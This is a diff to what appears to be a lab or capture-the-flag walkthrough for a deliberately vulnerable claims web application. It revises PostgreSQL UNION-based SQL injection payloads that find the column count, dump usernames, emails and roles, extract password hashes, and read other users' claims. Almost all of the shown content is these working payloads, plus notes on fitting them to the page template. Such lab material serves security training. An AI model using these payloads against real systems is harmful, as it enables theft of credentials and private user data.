@@ -81,7 +81,7 @@ Note the opening parenthesis `(` before `title`. The injection payload must **cl
 Test with:
 
 ```
-x') UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 -- 
+x') UNION SELECT 1::text,2::text,3::text,4::text,5::text,6::text,7::text,8::text,9::text,10::text,11::text,12::text -- 
 ```
 
 > **Important:** Make sure to include a trailing space after `--`. PostgreSQL requires it for the comment to be valid.
@@ -93,7 +93,7 @@ If the page loads without a "Query error" flash message, the column count is cor
 Enter the following payload in the search box:
 
 ```
-x') UNION SELECT id, username, email, username, role, 0.0, role, created_at, created_at, NULL, NULL, NULL FROM users -- 
+x') UNION SELECT id::text, username, email, username, role, '0', role, created_at::text, created_at::text, NULL::text, NULL::text, NULL::text FROM users -- 
 ```
 
 This maps user data to the columns the template renders:
@@ -111,7 +111,7 @@ This maps user data to the columns the template renders:
 The password hash column cannot be placed in the Amount position (`row[5]`) because the template tries to format it as a float (`"%.2f"|format(row[5])`). Use this separate payload to extract hashes:
 
 ```
-x') UNION SELECT id, username, email, password_hash, created_at::text, NULL, NULL, password_hash, NULL, NULL, NULL, NULL FROM users -- 
+x') UNION SELECT id::text, username, email, password_hash, created_at::text, NULL::text, NULL::text, password_hash, NULL::text, NULL::text, NULL::text, NULL::text FROM users -- 
 ```
 
 This places `password_hash` in the `additional_details` position (`row[7]`), which renders as plain text in the Submitted column.
@@ -121,7 +121,7 @@ This places `password_hash` in the `additional_details` position (`row[7]`), whi
 ### Step 6 — Extract all claims from other users
 
 ```
-x') UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 -- 
+x') UNION SELECT id::text, user_id::text, claim_type_id::text, title, description, amount::text, status, additional_details, created_at::text, updated_at::text, reviewed_by::text, review_notes FROM claims WHERE user_id != 1 -- 
 ```
 
 This returns claims belonging to all other users.
